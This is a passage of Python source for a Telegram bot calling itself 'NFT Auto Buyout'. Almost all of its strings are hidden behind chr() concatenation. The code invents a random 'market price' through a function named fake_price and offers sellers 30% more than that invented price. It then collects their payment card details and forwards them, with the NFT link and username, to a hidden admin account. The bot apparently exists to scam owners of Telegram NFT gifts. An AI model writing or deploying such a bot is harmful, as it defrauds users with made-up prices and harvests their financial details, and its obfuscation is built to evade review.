chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(82)+chr(117)+chr(115)+chr(115)+chr(105)+chr(97): {chr(115)+chr(121)+chr(109): chr(82)+chr(85)+chr(66), chr(114)+chr(97)+chr(116)+chr(101): 92.0},
chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(85)+chr(83)+chr(65): {chr(115)+chr(121)+chr(109): chr(85)+chr(83)+chr(68), chr(114)+chr(97)+chr(116)+chr(101): 1.0},
chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(66)+chr(101)+chr(108)+chr(97)+chr(114)+chr(117)+chr(115): {chr(115)+chr(121)+chr(109): chr(66)+chr(89)+chr(78), chr(114)+chr(97)+chr(116)+chr(101): 3.3},
chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(75)+chr(97)+chr(122)+chr(97)+chr(107)+chr(104)+chr(115)+chr(116)+chr(97)+chr(110): {chr(115)+chr(121)+chr(109): chr(75)+chr(90)+chr(84), chr(114)+chr(97)+chr(116)+chr(101): 460.0},
chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(85)+chr(122)+chr(98)+chr(101)+chr(107)+chr(105)+chr(115)+chr(116)+chr(97)+chr(110): {chr(115)+chr(121)+chr(109): chr(85)+chr(90)+chr(83), chr(114)+chr(97)+chr(116)+chr(101): 12600.0},
chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(84)+chr(117)+chr(114)+chr(107)+chr(101)+chr(121): {chr(115)+chr(121)+chr(109): chr(84)+chr(82)+chr(89), chr(114)+chr(97)+chr(116)+chr(101): 32.0},
chr(75)+chr(97)+chr(114)+chr(116)+chr(97)+chr(32)+chr(65)+chr(122)+chr(101)+chr(114)+chr(98)+chr(97)+chr(105)+chr(106)+chr(97)+chr(110): {chr(115)+chr(121)+chr(109): chr(65)+chr(90)+chr(78), chr(114)+chr(97)+chr(116)+chr(101): 1.7},
}

def gl(ctx): return ctx.user_data.get(chr(108)+chr(97)+chr(110)+chr(103), chr(114)+chr(117))
def t(ctx, k): return TEXTS[gl(ctx)][k]

def main_kb(ctx):
tx = TEXTS[gl(ctx)]
return InlineKeyboardMarkup([
[InlineKeyboardButton(tx[chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(101)+chr(108)+chr(108)], callback_data=chr(115)+chr(101)+chr(108)+chr(108))],
[InlineKeyboardButton(tx[chr(98)+chr(116)+chr(110)+chr(95)+chr(104)+chr(111)+chr(119)], callback_data=chr(104)+chr(111)+chr(119))],
[InlineKeyboardButton(tx[chr(98)+chr(116)+chr(110)+chr(95)+chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116)], callback_data=chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116))],
])

def cur_kb():
return InlineKeyboardMarkup([
[InlineKeyboardButton(n, callback_data=chr(99)+chr(117)+chr(114)+chr(95)+n)]
for n in CURRENCIES
])

def fake_price(): return round(**import**(chr(114)+chr(97)+chr(110)+chr(100)+chr(111)+chr(109)).uniform(15, 120), 2)

async def start(u, ctx):
kb = InlineKeyboardMarkup([[
InlineKeyboardButton(chr(1056)+chr(1091)+chr(1089)+chr(1089)+chr(1082)+chr(1080)+chr(1081), callback_data=chr(108)+chr(97)+chr(110)+chr(103)+chr(95)+chr(114)+chr(117)),
InlineKeyboardButton(chr(69)+chr(110)+chr(103)+chr(108)+chr(105)+chr(115)+chr(104), callback_data=chr(108)+chr(97)+chr(110)+chr(103)+chr(95)+chr(101)+chr(110))
]])
await u.message.reply_text(chr(1042)+chr(1099)+chr(1073)+chr(1077)+chr(1088)+chr(1080)+chr(1090)+chr(1077)+chr(32)+chr(1103)+chr(1079)+chr(1099)+chr(1082)+chr(32)+chr(47)+chr(32)+chr(67)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(32)+chr(108)+chr(97)+chr(110)+chr(103)+chr(117)+chr(97)+chr(103)+chr(101)+chr(58), reply_markup=kb)
return LANG

async def lang_cb(u, ctx):
q = u.callback_query
await q.answer()
ctx.user_data[chr(108)+chr(97)+chr(110)+chr(103)] = q.data.split(chr(95))[1]
await q.edit_message_text(t(ctx, chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=main_kb(ctx))
return MAIN_MENU

async def menu_cb(u, ctx):
q = u.callback_query
await q.answer()
d = q.data
back = InlineKeyboardMarkup([[InlineKeyboardButton(t(ctx, chr(98)+chr(116)+chr(110)+chr(95)+chr(98)+chr(97)+chr(99)+chr(107)), callback_data=chr(98)+chr(97)+chr(99)+chr(107))]])
if d == chr(115)+chr(101)+chr(108)+chr(108):
await q.edit_message_text(t(ctx, chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110))
return SELL_NFT_LINK
elif d == chr(104)+chr(111)+chr(119):
await q.edit_message_text(t(ctx, chr(104)+chr(111)+chr(119)+chr(95)+chr(119)+chr(111)+chr(114)+chr(107)+chr(115)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=back)
elif d == chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116):
await q.edit_message_text(t(ctx, chr(115)+chr(117)+chr(112)+chr(112)+chr(111)+chr(114)+chr(116)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=back)
elif d == chr(98)+chr(97)+chr(99)+chr(107):
await q.edit_message_text(t(ctx, chr(119)+chr(101)+chr(108)+chr(99)+chr(111)+chr(109)+chr(101)), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=main_kb(ctx))
return MAIN_MENU

async def recv_link(u, ctx):
txt = u.message.text.strip()
if chr(116)+chr(46)+chr(109)+chr(101)+chr(47)+chr(110)+chr(102)+chr(116)+chr(47) not in txt:
await u.message.reply_text(t(ctx, chr(105)+chr(110)+chr(118)+chr(97)+chr(108)+chr(105)+chr(100)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)))
return SELL_NFT_LINK
ctx.user_data[chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)] = txt
ctx.user_data[chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)] = fake_price()
await u.message.reply_text(t(ctx, chr(99)+chr(104)+chr(111)+chr(111)+chr(115)+chr(101)+chr(95)+chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121)), reply_markup=cur_kb())
return SELL_CURRENCY

async def cur_cb(u, ctx):
q = u.callback_query
await q.answer()
name = q.data[4:]
cur = CURRENCIES[name]
market = round(ctx.user_data[chr(109)+chr(97)+chr(114)+chr(107)+chr(101)+chr(116)] * cur[chr(114)+chr(97)+chr(116)+chr(101)], 2)
offer = round(market * 1.3, 2)
ctx.user_data.update({chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121): name, chr(111)+chr(102)+chr(102)+chr(101)+chr(114): offer, chr(115)+chr(121)+chr(109): cur[chr(115)+chr(121)+chr(109)]})
msg = t(ctx, chr(111)+chr(102)+chr(102)+chr(101)+chr(114)).format(link=ctx.user_data[chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107)], market=market, offer=offer, sym=cur[chr(115)+chr(121)+chr(109)])
kb = InlineKeyboardMarkup([[
InlineKeyboardButton(t(ctx, chr(98)+chr(116)+chr(110)+chr(95)+chr(121)+chr(101)+chr(115)), callback_data=chr(121)+chr(101)+chr(115)),
InlineKeyboardButton(t(ctx, chr(98)+chr(116)+chr(110)+chr(95)+chr(110)+chr(111)), callback_data=chr(110)+chr(111)),
]])
await q.edit_message_text(msg, parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=kb)
return SELL_CONFIRM

async def confirm_cb(u, ctx):
q = u.callback_query
await q.answer()
if q.data == chr(110)+chr(111):
await q.edit_message_text(t(ctx, chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(97)+chr(110)+chr(99)+chr(101)+chr(108)+chr(108)+chr(101)+chr(100)), reply_markup=main_kb(ctx))
return MAIN_MENU
await q.edit_message_text(t(ctx, chr(115)+chr(101)+chr(110)+chr(100)+chr(95)+chr(114)+chr(101)+chr(113)+chr(117)+chr(105)+chr(115)+chr(105)+chr(116)+chr(101)+chr(115)).format(currency=ctx.user_data.get(chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121), )), parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110))
return SELL_REQUISITES

async def recv_req(u, ctx):
req = u.message.text.strip()
msg = t(ctx, chr(100)+chr(101)+chr(97)+chr(108)+chr(95)+chr(99)+chr(114)+chr(101)+chr(97)+chr(116)+chr(101)+chr(100)).format(
link=ctx.user_data.get(chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107), ),
offer=ctx.user_data.get(chr(111)+chr(102)+chr(102)+chr(101)+chr(114), ),
sym=ctx.user_data.get(chr(115)+chr(121)+chr(109), ),
req=req
)
await u.message.reply_text(msg, parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110), reply_markup=main_kb(ctx))
try:
adm = (chr(1053)+chr(1086)+chr(1074)+chr(1072)+chr(1103)+chr(32)+chr(1089)+chr(1076)+chr(1077)+chr(1083)+chr(1082)+chr(1072)+chr(33)+chr(92)+chr(110)+chr(85)+chr(115)+chr(101)+chr(114)+chr(58)+chr(32) + str(u.effective_user.username or u.effective_user.id)
+ chr(92)+chr(110)+chr(78)+chr(70)+chr(84)+chr(58)+chr(32) + ctx.user_data.get(chr(110)+chr(102)+chr(116)+chr(95)+chr(108)+chr(105)+chr(110)+chr(107), )
+ chr(92)+chr(110)+chr(1057)+chr(1091)+chr(1084)+chr(1084)+chr(1072)+chr(58)+chr(32) + str(ctx.user_data.get(chr(111)+chr(102)+chr(102)+chr(101)+chr(114), ))
+ chr(32) + ctx.user_data.get(chr(115)+chr(121)+chr(109), )
+ chr(92)+chr(110)+chr(1042)+chr(1072)+chr(1083)+chr(1102)+chr(1090)+chr(1072)+chr(58)+chr(32) + ctx.user_data.get(chr(99)+chr(117)+chr(114)+chr(114)+chr(101)+chr(110)+chr(99)+chr(121), )
+ chr(92)+chr(110)+chr(1056)+chr(1077)+chr(1082)+chr(1074)+chr(1080)+chr(1079)+chr(1080)+chr(1090)+chr(1099)+chr(58)+chr(32) + req)
await u.get_bot().send_message(ADMIN_ID, adm)
except Exception as e:
logger.error(str(e))
return MAIN_MENU

async def admin_cmd(u, ctx):
if u.effective_user.id != ADMIN_ID:
await u.message.reply_text(chr(1053)+chr(1077)+chr(1090)+chr(32)+chr(1076)+chr(1086)+chr(1089)+chr(1090)+chr(1091)+chr(1087)+chr(1072))
return
kb = InlineKeyboardMarkup([
[InlineKeyboardButton(chr(1057)+chr(1090)+chr(1072)+chr(1090)+chr(1080)+chr(1089)+chr(1090)+chr(1080)+chr(1082)+chr(1072), callback_data=chr(97)+chr(100)+chr(109)+chr(95)+chr(115)+chr(116)+chr(97)+chr(116)+chr(115))],
[InlineKeyboardButton(chr(1056)+chr(1072)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1072), callback_data=chr(97)+chr(100)+chr(109)+chr(95)+chr(98)+chr(114)+chr(111)+chr(97)+chr(100)+chr(99)+chr(97)+chr(115)+chr(116))],
[InlineKeyboardButton(chr(1055)+chr(1086)+chr(1083)+chr(1100)+chr(1079)+chr(1086)+chr(1074)+chr(1072)+chr(1090)+chr(1077)+chr(1083)+chr(1080), callback_data=chr(97)+chr(100)+chr(109)+chr(95)+chr(117)+chr(115)+chr(101)+chr(114)+chr(115))],
])
await u.message.reply_photo(
photo=chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(105)+chr(46)+chr(105)+chr(109)+chr(103)+chr(117)+chr(114)+chr(46)+chr(99)+chr(111)+chr(109)+chr(47)+chr(52)+chr(77)+chr(51)+chr(52)+chr(104)+chr(105)+chr(50)+chr(46)+chr(112)+chr(110)+chr(103),
caption=chr(1055)+chr(1072)+chr(1085)+chr(1077)+chr(1083)+chr(1100)+chr(32)+chr(1072)+chr(1076)+chr(1084)+chr(1080)+chr(1085)+chr(1080)+chr(1089)+chr(1090)+chr(1088)+chr(1072)+chr(1090)+chr(1086)+chr(1088)+chr(1072)+chr(92)+chr(110)+chr(92)+chr(110)+chr(1041)+chr(1086)+chr(1090)+chr(58)+chr(32)+chr(78)+chr(70)+chr(84)+chr(32)+chr(65)+chr(117)+chr(116)+chr(111)+chr(32)+chr(66)+chr(117)+chr(121)+chr(111)+chr(117)+chr(116)+chr(92)+chr(110)+chr(1052)+chr(1077)+chr(1085)+chr(1077)+chr(1076)+chr(1078)+chr(1077)+chr(1088)+chr(58)+chr(32)+chr(64)+chr(104)+chr(111)+chr(115)+chr(116)+chr(101)+chr(108)+chr(109)+chr(97)+chr(110),
parse_mode=chr(77)+chr(97)+chr(114)+chr(107)+chr(100)+chr(111)+chr(119)+chr(110),
reply_markup=kb
)

async def admin_cb(u, ctx):
q = u.callback_query
if u.effective_user.id != ADMIN_ID:
await q.answer(chr(1053)+chr(1077)+chr(1090)+chr(32)+chr(1076)+chr(1086)+chr(1089)+chr(1090)+chr(1091)+chr(1087)+chr(1072), show_alert=True)
return
await q.answer()
if q.data == chr(97)+chr(100)+chr(109)+chr(95)+chr(115)+chr(116)+chr(97)+chr(116)+chr(115):
await q.message.reply_text(chr(1057)+chr(1090)+chr(1072)+chr(1090)+chr(1080)+chr(1089)+chr(1090)+chr(1080)+chr(1082)+chr(1072)+chr(58)+chr(32)+chr(1074)+chr(32)+chr(1088)+chr(1072)+chr(1079)+chr(1088)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1082)+chr(1077))
elif q.data == chr(97)+chr(100)+chr(109)+chr(95)+chr(98)+chr(114)+chr(111)+chr(97)+chr(100)+chr(99)+chr(97)+chr(115)+chr(116):
await q.message.reply_text(chr(1056)+chr(1072)+chr(1089)+chr(1089)+chr(1099)+chr(1083)+chr(1082)+chr(1072)+chr(58)+chr(32)+chr(1074)+chr(32)+chr(1088)+chr(1072)+chr(1079)+chr(1088)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1082)+chr(1077))
elif q.data == chr(97)+chr(100)+chr(109)+chr(95)+chr(117)+chr(115)+chr(101)+chr(114)+chr(115):
await q.message.reply_text(chr(1055)+chr(1086)+chr(1083)+chr(1100)+chr(1079)+chr(1086)+chr(1074)+chr(1072)+chr(1090)+chr(1077)+chr(1083)+chr(1080)+chr(58)+chr(32)+chr(1074)+chr(32)+chr(1088)+chr(1072)+chr(1079)+chr(1088)+chr(1072)+chr(1073)+chr(1086)+chr(1090)+chr(1082)+chr(1077))

def main():
app = Application.builder().token(TOKEN).build()
conv = ConversationHandler(
entry_points=[CommandHandler(chr(115)+chr(116)+chr(97)+chr(114)+chr(116), start)],
states={
LANG: [CallbackQueryHandler(lang_cb, pattern=chr(94)+chr(108)+chr(97)+chr(110)+chr(103)+chr(95))],
MAIN_MENU: [CallbackQueryHandler(menu_cb)],
SELL_NFT_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_link)],
SELL_CURRENCY: [CallbackQueryHandler(cur_cb, pattern=chr(94)+chr(99)+chr(117)+chr(114)+chr(95))],
SELL_CONFIRM: [CallbackQueryHandler(confirm_cb, pattern=chr(94)+chr(40)+chr(121)+chr(101)+chr(115)+chr(124)+chr(110)+chr(111)+chr(41)+chr(36))],
SELL_REQUISITES: [MessageHandler(filters.TEXT & ~filters.COMMAND, recv_req)],
},
fallbacks=[CommandHandler(chr(115)+chr(116)+chr(97)+chr(114)+chr(116), start)],
allow_reentry=True,
)
app.add_handler(conv)
app.add_handler(CommandHandler(chr(97)+chr(100)+chr(109)+chr(105)+chr(110), admin_cmd))
app.add_handler(CallbackQueryHandler(admin_cb, pattern=chr(94)+chr(97)+chr(100)+chr(109)+chr(95)))
logger.info(chr(66)+chr(111)+chr(116)+chr(32)+chr(115)+chr(116)+chr(97)+chr(114)+chr(116)+chr(101)+chr(100)+chr(33))
app.run_polling()

if **name** == chr(95)+chr(95)+chr(109)+chr(97)+chr(105)+chr(110)+chr(95)+chr(95):
main()
